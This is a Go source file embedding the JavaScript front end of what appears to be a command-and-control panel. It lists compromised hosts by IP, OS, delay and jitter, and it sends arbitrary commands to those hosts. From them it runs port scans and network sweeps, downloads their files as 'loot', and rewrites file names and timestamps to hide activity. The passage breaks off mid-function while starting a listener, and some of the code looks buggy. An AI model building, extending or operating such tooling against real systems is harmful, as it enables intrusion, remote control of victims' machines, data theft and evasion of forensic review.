package web_ui
import (
	"net/http"
	"fmt"
)
func Js(error_str string, sessionSlice []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		_, ok := CheckUserSession(r, sessionSlice, error_str)
        if !ok {
            fmt.Fprint(w, error_str)
            return
        }
		if r.Method == http.MethodGet {
html := `
const TaskId = Math.random().toString(36).substring(2) + Date.now();

class index{
    constructor() {
      this.server = window.location.protocol + "//" + window.location.host;
      this.username = this.getCookie("cookie");
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
      lainShell(){
        if (this.username){
            let interval_server=this.server+"/user_index?op=listen&username="+this.username;
            setInterval(function(){
                fetch(interval_server)
                .then(response=>{
                    return response.text();
                })
                .then(data=>{
                let div = document.getElementById('div_conn');
                    div.innerHTML=data;
                })
                },3500)
            }
      }
      get(uid,shellname){
        let confirm1 = confirm('confirm?');
        if(confirm1){
            let key_url= this.server+"/user_index?op=insertKey&uid="+uid+"&username="+this.username+"&request="+shellname;
            fetch(key_url,{
                credentials: 'include' // 发送 cookie
            })
                return uid
            }
        }
        del(uid){
            let right = confirm('confirm?');
            let ms = confirm('ok');
            if (right && ms){
                document.getElementById("container-"+uid)?.remove();
                fetch(this.server+"/user_index?op=delIndex&uid="+uid)
                .then(response=>response.text())
                .then(data=>{
                })
            }
        }
      }
      
      class lain_shell{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            const urlParams = new URLSearchParams(window.location.search);
            this.uid=urlParams.get('uid');
            this.username=this.getCookie("cookie");
            // this.results=document.getElementById('results').innerHTML;
            // document.getElementById('shellname').innerText=this.shellname;
            this.shell_dir = '';
            this.isMovingFile = false;
            this.move_file = this.move_file.bind(this);
            this.look_file = this.look_file.bind(this);
            this.intervalId = null;
            this.currentInput="";
            this.inputContainer="";
            this.inputKeydown = this.inputKeydown.bind(this);
            this.init();
        }

        init(){
            fetch(this.server+"/user_index?op=getCurrentDir&uid="+this.uid)
            .then(response => response.text())
            .then(data => {
                this.shell_dir = data;
                console.log(this.shell_dir);
            })
        }

        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }      
        async lain_time() {
            if (this.uid) {
                let interval_server =this.server+"/user_index?op=getResults&uid="+this.uid+"&Taskid="+TaskId;
                let self = this;
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                }
                return new Promise((resolve, reject) => {
                    this.intervalId = setInterval(async function () {
                        try {
                            let response = await fetch(interval_server, {
                                method: 'GET',
                                headers: {
                                    'Referer': 'http://localhost/html/lain.js',
                                }
                            });
                            let data = await response.text();
                            if (data) {
                                const output = document.createElement('div');
                                output.contentEditable = true;
                                output.textContent = data;
                                output.className = 'output';
                                const inputContainer = terminal.querySelector('.input-container');
                                inputContainer.appendChild(output);
                                terminal.scrollTop = terminal.scrollHeight;
                                clearInterval(self.intervalId);
                                self.intervalId = null;
                                resolve(true);
                            }
                        } catch (error) {
                            console.error('Error:', error);
                            reject(false);
                        }
                    }, 1000);
                });
            } else {
                console.log('uid为空');
                return false;
            }
        }
        async get(command){
            if(command === "--help" && this.uid){
                const output = document.createElement('div');
                output.className = 'output';
                output.contentEditable = true;
                output.textContent = '--help: View help information\n' +
                    'scan: scan port(1-65535,scan [IP] [range(1,20,45...)or(1-65534)] [delay])\n' +
                    'sniff: scan host(sniff [net.range(1,20,45...)or(1-253)] [range(1,20,45...)or(1-65534)] [delay])\n';
                const inputContainer = terminal.querySelector('.input-container');
                inputContainer.appendChild(output);
                this.createInput();
            } else if (command.startsWith("scan") && this.uid) {
                this.sendjob('scan...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let port_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "GET_PORTS^"+target+"^"+port_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId;
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            } else if (command.startsWith("sniff") && this.uid) {
                this.sendjob('sniff...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let sniff_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "GET_U_FRIENDS^"+target+"^"+sniff_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId;
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                        this.createInput();
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }else if(this.uid){
                this.sendjob('agent'); // 创建新的提示符
                let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(command)+"&Taskid="+TaskId;
                await fetch(url,{
                    credentials: 'include' // 发送 cookie
                });
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }
        }
        input(){
            const inputElement = document.getElementById("input");
            currentInput = inputElement;
            inputElement.addEventListener("keydown", (event) => { // 使用箭头函数
                if (event.key === "Enter") {
                    event.preventDefault();
                    const command = currentInput.value.trim();
                    if (command) {
                        this.get(command); // this 现在指向正确的上下文
                    }
                }
            })
        }
        async sendjob(str){
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = str+' SendMsg--->>';
            const terminal = document.getElementById("terminal");
            const inputContainer = terminal.querySelector(".input-container");
            inputContainer.appendChild(newPrompt);
        }
        createInput() {
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = 'Command>';
            const newInput = document.createElement('input');
            newInput.type = 'text';
            newInput.className = 'shell-input';
            newInput.addEventListener('keydown', this.inputKeydown);
            currentInput.value = '';
            inputContainer.appendChild(newPrompt);
            inputContainer.appendChild(newInput);
            newInput.focus();
            currentInput = newInput;
        }
        async inputKeydown(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const command = currentInput.value.trim();
                if (command) {
                    await this.get(command);
                    let flag = await this.lain_time();
                    if (flag) {
                        createInput();
                    }
                }
            }
        }
        async loadFile(file_name,fileSize){
            if(fileSize && file_name){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                let file_key =  this.uid + "*" + file_name + "*" + splitSize
                var powershell = "LOAD_U_FILE^"+file_key;
                fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell)+"&Taskid="+TaskId)
                .then(response => response.text())
                .then()
                return true;
            }
        }
        async getFile(path){
            if(path){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                var powershell = "GET_U_FILE^" + path + "^" + splitSize;
                fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell)+"&Taskid="+TaskId)
                .then(response => response.text())
                .then();
            }
        }
        renderFileList(fileContent, shell_dir = "") {
            const div_file = document.getElementById('file');
            div_file.innerHTML = '';
            const dir_list = fileContent.split("\n");
            for (let i = 0; i < dir_list.length; i++) {
                let file = dir_list[i].trim();
                if (!file) continue;
                let new_file = document.createElement('div');
                new_file.classList.add('directory');
                let isDir = file.startsWith("dir ");
                let isFil = file.startsWith("fil ");
                let type = isDir ? "dir" : (isFil ? "fil" : null);
                if (!type) continue;
                let match = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)>$/);
                let matchFile = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)><([^<>]+)>$/);
                let name = "", size = "", perm = "", mtime = "";
                if (matchFile && type === "fil") {
                    name = matchFile[2];
                    size = matchFile[3];
                    perm = matchFile[4];
                    mtime = matchFile[5];
                } else if (match && type === "dir") {
                    name = match[2];
                    perm = match[3];
                    mtime = match[4];
                } else {
                    continue;
                }
                let full_path = shell_dir ? (shell_dir + "/" + name) : name;
                let renameBtn = "<button class='rename-btn' style='margin-left:5px;'>✏️</button>";
                let timeBtn = "<button class='time-btn' style='margin-left:5px;'>⏰</button>";
                if (type === "dir") {
                    new_file.classList.add('dir');
                    new_file.innerHTML =
                        '<span class="icon-dir">📁</span>' +
                        '<span class="filename">' + name + '</span>' +
                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
                        renameBtn + timeBtn;
                    new_file.onclick = () => {
                        this.move_file(0, name);
                    };
                } else {
                    new_file.classList.add('file');
                    new_file.innerHTML =
                        '<span class="icon-file">📄</span>' +
                        '<span class="filename">' + name + '</span>' +
                        '<span class="filesize">&lt;' + size + '&gt;</span>' +
                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
                        '<span class="icon-download" style="cursor:pointer;">⬇️</span>' +
                        renameBtn + timeBtn;
                    new_file.addEventListener('click', () => {
                        this.getFile(full_path);
                    });
                    new_file.querySelector('.icon-download')?.addEventListener('click', (e) => {
                        e.stopPropagation();
                        this.getFile(full_path);
                    });
                }
                new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const filenameSpan = new_file.querySelector('.filename');
                    const oldName = filenameSpan.innerText;
                    const newName = prompt("Enter the new name:", oldName);
                    if (newName && newName !== oldName) {
                        const cmd = "CHANG_FILE_NAME^" + full_path + "^" + newName;
                        fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
                        filenameSpan.innerText = newName;
                    }
                });
                new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
                    if (newTime) {
                        const cmd = "CHANG_FILE_TIME^" + full_path + "^" + newTime;
                        fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(cmd))+"&Taskid="+TaskId;
                        new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
                    }
                });
                div_file.appendChild(new_file);
            }
        }
        async history_file() {
            if (this.uid) {
                const fileResponse = await fetch(this.server + "/user_index?op=readFileList&uid=" + this.uid);
                const result = await fileResponse.json();
                const historyParent = document.getElementById('history');
                if (historyParent) {
                    historyParent.innerHTML = '';
                    if (result && Array.isArray(result.data)) {
                        result.data.forEach((item, idx) => {
                            let listDiv = document.createElement('div');
                            listDiv.textContent = item.list;
                            listDiv.classList.add('history-item');
                            listDiv.style.cursor = 'pointer';
                            listDiv.style.display = 'flex';
                            listDiv.style.justifyContent = 'space-between';
                            listDiv.style.alignItems = 'center';
                            listDiv.onclick = () => {
                                if (item.file) {
                                    this.shell_dir = item.list;
                                    this.renderFileList(item.file, item.list);
                                }
                            };
                            let delBtn = document.createElement('span');
                            delBtn.textContent = '🗑️';
                            delBtn.title = 'delete';
                            delBtn.style.color = 'red';
                            delBtn.style.cursor = 'pointer';
                            delBtn.style.marginLeft = '8px';
                            delBtn.onclick = async (e) => {
                                e.stopPropagation();
                                const res = await fetch(this.server + "/user_index?op=delFileList&uid=" + this.uid + "&index=" + idx);
                                const r = await res.json();
                                if (r.code === "200") {
                                    listDiv.remove();
                                }
                            };
                            listDiv.appendChild(delBtn);
                            historyParent.appendChild(listDiv);
                        });
                    }
                }
            }
        }
        async look_file(dir) {
            if (this.uid && dir) {
                const powershell = "LOOK_UP_FILE^" + dir;
                try {
                    await fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell)+"&Taskid="+TaskId);
                    while (true) {
                        await new Promise(resolve => setTimeout(resolve, 5000));
                        const fileResponse = await fetch(this.server + "/user_index?op=getFileList&uid=" + this.uid+"&Taskid="+TaskId);
                        const data = await fileResponse.text();
                        if (data) {
                            this.renderFileList(data, this.shell_dir);
                            return true;
                        } else if (data === "is empty") {
                            return false;
                        }
                    }
                } catch (error) {
                    console.error("Viewing directory failed:", error);
                    return false;
                }
            }
        }
         async move_file(num, cur_dir) {
            let cur_dir_p = document.getElementById("cur_dir_p");
            if (this.isMovingFile) {
                console.log("Don't move around....");
                return;
            }
            this.isMovingFile = true; // 锁定操作
            let temp_dir = this.shell_dir; // 保存当前路径
            try {
                if (this.uid) {
                    if (num === 1 && cur_dir === 'no') {
                        this.shell_dir += '/..'; // 返回上级目录
                    } else if (num === 0) {
                        // 解析目录路径
                        this.shell_dir += "/" + cur_dir;
                    }
                    // 确保 look_file 异步执行
                    let flag = await this.look_file(this.shell_dir);
                    if (!flag) {
                        this.shell_dir = temp_dir; // 回退路径
                        alert("!Does not exist or has no permission to access this directory?");
                    }
                    console.log(this.shell_dir);
                }
            } catch (error) {
                console.error("An error occurred in move_file:", error);
            } finally {
                // 保证最终解锁
                cur_dir_p.textContent = "Path:\t" + this.shell_dir;
                this.isMovingFile = false;
            }
        }
        async move_dir(){
            let cur_dir_p = document.getElementById("cur_dir_p");
            let temp_dir = this.shell_dir;
            let directory = document.getElementById("directoryInput").value;
            this.shell_dir = directory;
            let flag = await this.look_file(this.shell_dir);
            if (!flag) {
                this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
                console.log("!Does not exist or has no permission to access this directory?")
            }
            console.log(this.shell_dir);
            cur_dir_p.textContent="Path:\t"+this.shell_dir;
        }
        get_btn_move(){
            var btn = document.getElementById('dir-btn');
            btn.addEventListener('click', async () => {
                this.move_file(1,'no')
            })
        }

        switchVer(value){
            let cmd = "SWITCH_VERSION^"+value;
            fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd))+"&Taskid="+TaskId;
        }
    }
    
    //主页面类
    class lain_index{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            this.username = this.getCookie("cookie");
            this.User_data = [];
            this.check_time = [];
            this.check_uid = [];
        }
        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }
        lain_shell() {
            if (this.username) {
                let container = document.getElementById('div_index');
                setInterval(() => {
                    let interval_server = this.server + "/user_index?op=userIndex&clientsCount=" + Object.keys(this.User_data).length;
                    fetch(interval_server)
                        .then(response => {
                            if (!response.ok && response.status === 400) {
                                return response.text(); 
                            }
                            if (response.ok) {
                                if (response.headers.get('Content-Type').includes('application/json')) {
                                    return response.json();
                                } else {
                                    return {};
                                }
                            } else {
                                return {};
                            }
                        })
                        .then(data => {
                            if (data === 'noNeeded') {
                                return;
                            } else if (Array.isArray(data) && data.length > 0) {
                                this.User_data = data;
                                net_init(this.User_data);
                                this.User_data.forEach(key => {
                                    let userDiv = document.getElementById(key['uid'] + "info");
                                    if (!userDiv) {
                                        userDiv = document.createElement('div');
                                        userDiv.classList.add('ip-info');
                                        userDiv.id = key['uid'] + "info";
                                        container.appendChild(userDiv);
                                    }

                                    let pluginButtons = ''; // 收集所有按钮 HTML
                                    let pluginParam = key['plugin_parameter'];
                                    let os = key['os'].toLowerCase(); // 加入 os 判断

                                    if (pluginParam && typeof pluginParam === 'object' && pluginParam[os]) {
                                        for (let codeword in pluginParam[os]) {
                                            let paramDescList = pluginParam[os][codeword];
                                            console.log('客户端', key['uid'], os + '插件：', codeword, paramDescList);
                                            let encodedDesc = encodeURIComponent((Array.isArray(paramDescList) ? paramDescList : []).join(','));
                                            let plugindiv = '<button class="console-link" onclick="openIframe(\'/pluginHtml?uid='
                                                + key['uid'] + '&os=' + os
                                                + '&paramDescList=' + encodedDesc
                                                + '&codeword=' + codeword + '\')">[' + codeword + ']</button>';
                                            pluginButtons += plugindiv;
                                        }
                                    }

                                    let osEmoji = "💻";
                                    if (os.includes("linux")) {
                                        osEmoji = "🐧";
                                    } else if (os.includes("macos")) {
                                        osEmoji = "🍏";
                                    } else if (os.includes("android")) {
                                        osEmoji = "🤖";
                                    }

                                    let userHTML = '<div class="conn-container">' +
                                        '<span class="shell-address">' + key['external_ip'] + '/</span>' +
                                        '<span class="ip-address">' + key['host'] + '/</span>' +
                                        '<span class="ip-address">' + key['uid'] + '/</span>' +
                                        '<div class="os-container">' +
                                            '<span class="ip-address">'+ key['server'] + '/'+'</span>' +
                                            '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
                                            '<span class="ip-address">'+ osEmoji + '/' + key['os'] + '</span>' +
                                        '</div>' +
                                    '</div>' +
                                    '<div class="button-container">' +
                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
                                        '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
                                        '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
                                    '</div>' +
                                    '<div class="info-content" id="' + key['uid'] + '-info-content">' +
                                        '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">Path:</strong><strong class="s_right">' + key['current_dir'] + '</strong></p>' +
                                        '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
                                        '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
                                        '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
                                        '<p><strong class="s_left">Executable:</strong><strong class="s_right">' + key['executable'] + '</strong></p>' +
                                        '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
                                        '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">Jitter:</strong><input type="text" value="' + key['jitter'] + '" id="jitter_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
                                        '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                        '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
                                    '</div>' +
                                    '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                        '<button class="console-link" onclick="openIframe(\'/cmdHtml?uid=' + key['uid'] + '&host=' + encodeURIComponent(key['host']) + '\')">💻</button>' +
                                        '<button class="console-link" onclick="openIframe(\'/fileHtml?uid=' + key['uid'] + '&host=' + encodeURIComponent(key['host']) + '\')">🗂️</button>' +
                                        '<button class="console-link" onclick="openIframe(\'/msgHtml?uid=' + key['uid'] + '&host=' + encodeURIComponent(key['host']) + '\')">📩</button>' +
                                        pluginButtons +
                                    '</div>' +
                                    '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';

                                    userDiv.innerHTML = userHTML;
                                });
                            } else if (Array.isArray(data) && data.length === 0) {
                                console.log("No data available, clearing container.");
                                container.innerHTML = '';
                            }
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        saveInfo(uid) {
            const remarks = document.getElementById('remarks_' + uid).value;
            const delay = document.getElementById('delay_' + uid).value;
            const jitter = document.getElementById('jitter_' + uid).value;
            const username = document.getElementById('username_' + uid).value;
            fetch(this.server + "/user_index?op=change", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    remarks: remarks,
                    delay: delay,
                    jitter: jitter,
                    username: username,
                    uid: uid,
                    taskid: TaskId
                })
            })
            .then(response => response.text())
            .then(data => {
                if (data === 'confirm') {
                    console.log("Changes saved!");
                    const userIndex = this.User_data.findIndex(client => client.uid === uid);
                    if (userIndex !== -1) {
                        this.User_data[userIndex].remarks = remarks;
                        this.User_data[userIndex].delay = delay;
                        this.User_data[userIndex].jitter = jitter;
                        this.User_data[userIndex].username = username;
                    }
                    this.updateUserUI(uid, remarks, delay, username, jitter);
                } else {
                    let new_user = document.getElementById('username_' + uid).value;
                    if(new_user){
                        let change_url = this.server + "/user_index?op=confirm&uid=" + uid + "&username=" + new_user;
                        fetch(change_url)
                            .then(response => response.json())
                            .then(clients => {
                                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                                if (userIndex !== -1) {
                                    this.User_data[userIndex].remarks = remarks;
                                    this.User_data[userIndex].delay = delay;
                                    this.User_data[userIndex].username = username;
                                    this.User_data[userIndex].jitter = jitter;
                                }
                                this.updateUserUI(uid, remarks, delay, username, jitter);
                            });
                    }
                }
            })
            .catch(error => {
                console.error("Error saving changes:", error);
            });
            if (username !== this.username) {
                const userIndex = this.User_data.findIndex(client => client.uid === uid);
                if (userIndex !== -1) {
                    this.User_data.splice(userIndex, 1);
                }
                let userDiv = document.getElementById(uid+"info");
                if (userDiv) {
                    userDiv.remove();
                }
            }
        }
        updateUserUI(uid, remarks, delay, username, jitter) {
            document.getElementById('remarks_' + uid).value = remarks;
            document.getElementById('delay_' + uid).value = delay;
            document.getElementById('username_' + uid).value = username;
            document.getElementById('jitter_' + uid).value = jitter;
        }
        checkTime() {
            if (this.username) {
                let check_url = this.server + "/user_index?op=checkTime&username=" + this.username;
                setInterval(() => {
                    fetch(check_url)
                        .then(response => {
                            if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                                return response.json();
                            } else {
                                throw new Error("Invalid JSON response");
                            }
                        })
                        .then(data => {
                            this.check_time.forEach(item => {
                                let userDiv = document.getElementById(item.uid + "info");
                                if (userDiv) {
                                    let imgElement = document.getElementById(item.uid + "-img");
                                    let checkElement = document.getElementById(item.uid + "-check");
                                    if (imgElement) {
                                        if (item.checkTime !== data.find(i => i.uid === item.uid)?.checkTime) {
                                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
                                        } else {
                                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
                                        }
                                    }
                                    checkElement.innerText = item.checkTime;
                                }
                            });
                            console.log(this.check_time,data);
                            this.check_time = data;
                        })
                        .catch(error => {
                            console.error("Error fetching data:", error);
                        });
                }, 5000);
            }
        }
        del(shell) {
            let right = confirm('Confirm to remove?');
            if (right) {
                fetch(this.server + "/user_index?op=delInfo&uid=" + shell)
                    .then(response => response.text())
                    .then(data => {
                        alert(data);
                        this.User_data = this.User_data.filter(user => user.uid !== shell);
                        const userDiv = document.getElementById(shell + "info");
                        if (userDiv) {
                            userDiv.remove();  // 删除对应的 div 元素
                        }
                    })
                    .catch(error => console.error("Error:", error));
            }
        }
        
    getAll(os,cmd){
        if(os!="" && cmd!=""){
            fetch(this.server+"/user_index?op=AllMsg&username="+this.username+"&osType="+os+"&msg="+encodeURIComponent(cmd))
        }
    }
    async getloot() {
        const lootFileDiv = document.getElementById('g_file');
        // 每隔 5 秒自动发送请求
        setInterval(async () => {
            try {
                let response = await fetch(this.server+"/user_index?op=getFile&username=" + this.username);
                if (!response.ok) {
                    throw new Error("Failed to fetch loot");
                }
                let lootHTML = await response.text();
                lootFileDiv.innerHTML = lootHTML;  // 更新页面内容
            } catch (error) {
                console.error("Error fetching loot:", error);
            }
        }, 5000);  // 5000 毫秒 = 5 秒
    }
    
}
class lain_net{
    constructor(){
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.shell_list=[];
    }
    
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    
    async getNet() {
        // 定时发送请求
        try {
            setInterval(async () => {
                var uid = document.getElementById('net_shell').value;
                if (uid) {
                    await fetch(this.server + "/user_index?op=net_getresults&uid=" + uid);
                    let net_json = await fetch(this.server + "/user_index?op=getInnet&uid=" + uid);
                    let text = await net_json.text();
                    console.log("Response Text:", text);
                    let net_data;
                    try {
                        net_data = JSON.parse(text);
                    } catch (e) {
                        return;
                    }
                    let net = document.getElementById('net_div');
                    net.innerHTML = ''; 
                    net_data.forEach(item => {
                        let div = document.createElement('div');
                        div.classList.add("net_div_son");
                        div.style.display = 'flex'; 
                        div.style.justifyContent = 'space-between';
                        let contentDiv = document.createElement('div');
                        contentDiv.innerHTML = "<strong></strong>" + item.target + "<br>";
                        // 添加空值检查和数组类型检查
                        if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
                            let innetDiv = document.createElement('div');
                            let sanitizedText = item.shell_innet.join(',\n');
                            sanitizedText = sanitizedText.replace(/\{\{\{([^}]+)\}\}\}/g, function(match, content) {
                                let escapedContent = content.replace(/[\s\S]/g, function(char) {
                                    return '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4);
                                });
                                // 返回替换后的内容，保持外面的大括号
                                return escapedContent;
                            });
                            sanitizedText = "<strong>" + sanitizedText + "</strong>";
                            innetDiv.innerHTML = sanitizedText;
                            contentDiv.appendChild(innetDiv);

                        }
                        div.appendChild(contentDiv);
                        let button = document.createElement('button');
                        button.onclick = () => this.del_net(item.target, uid);
                        button.textContent = 'remove';
                        button.style.marginLeft = 'auto';
                        div.appendChild(button);
                        net.appendChild(div);
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Error in getNet:', error);
        }
    }
    async scan(){
        var uid = document.getElementById('net_shell').value;
        let optionValue = document.getElementById('net_options').value; //选项
        let targetValue = document.getElementById('net_target').value; //目标
        let targetListValue = document.getElementById('net_target_list').value; //探测范围
        var sleepTimeValue = document.getElementById('net_sleep_time').value; //休眠时间
        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //自定义时间
        if (sleepTimeValue === 'custom') {
            sleepTimeValue = customSleepTimeValue;
        }
        console.log('Select:', optionValue);
        console.log('IP:', targetValue);
        console.log('Range:', targetListValue);
        console.log('Delay:', sleepTimeValue);
        
        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
            sleepTimeValue = 1; // 默认最小值为1
        }

        if(optionValue === "scan"){
            var cmd="GET_PORTS^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }else if(optionValue === "sniff"){
            var cmd="GET_U_FRIENDS^"+targetValue+"^"+targetListValue+"^"+sleepTimeValue+"^save";
        }
        await fetch(this.server+"/user_index?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd))+"&Taskid=scanTask";
    }
    del_net(target,uid){
        fetch(this.server+"/user_index?op=delShellInnet&uid="+uid+"&target="+target)
    }
    async getshellip(){
        var uid = document.getElementById('net_shell').value;
        let shell_ip_json = await fetch(this.server+"/user_index?op=getShellInnet&uid="+uid);
        let shell_ip_str = await shell_ip_json.text();  // 获取到的依然是字符串
        let shell_ip_list = shell_ip_str.split(',');  // 将逗号分隔的字符串转换为数组
        let have_ip_div = document.getElementById('have_ip');
        have_ip_div.innerHTML="";
        let cur_div = document.createElement('div');
        cur_div.textContent='Host net:';
        have_ip_div.appendChild(cur_div);
        shell_ip_list.forEach(item => {
            let div = document.createElement('div');
            div.innerHTML = "IP:"+item+"\t";  // 将每个IP显示在新的行中
            have_ip_div.appendChild(div);
        });
    }
}

class lain_server {
    constructor() {
        this.server = window.location.protocol + "//" + window.location.host;
        this.username = this.getCookie("cookie");
        this.server_data = [];
        this.server_pulgin = [];
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
    clear_memory(){
        fetch(this.server+'/user_index?op=cleanup')
    }
    async get_server_pulgin(port,codeWord,code,os,parameter) {
        const data = {
            port: port,
            codeWord: codeWord,
            code: code,
            os: os,
            parameter: parameter
        };
        this.server_pulgin.push(data);
        console.log("Plugin data added:", data);
        return data;
    }
    async start_server() {
        const form = document.getElementById("serverForm");

        // 使用 FormData 获取表单数据
        const formData = new FormData(form);
        const jsonData = {};

        // 处理证书和密钥的内容
        const certContent = formData.get("cert") || ""; // 获取证书内容，默认为空字符串
        const keyContent = formData.get("key") || ""; // 获取密钥内容，默认为空字符串

        // 将表单数据转换为 JSON 格式
        formData.forEach((value, key) => {
            if (key !== "cert" && key !== "key") {
                jsonData[key] = value;  // 其他字段直接添加
            }
        });

        console.log("Form data to be sent:", jsonData);

        // 添加证书和密钥到 jsonData
        jsonData.cert = certContent;
        jsonData.key = keyContent;

        try {
            const res = await fetch("/user_index?op=startServer", {
                method: "POST",
                headers: {
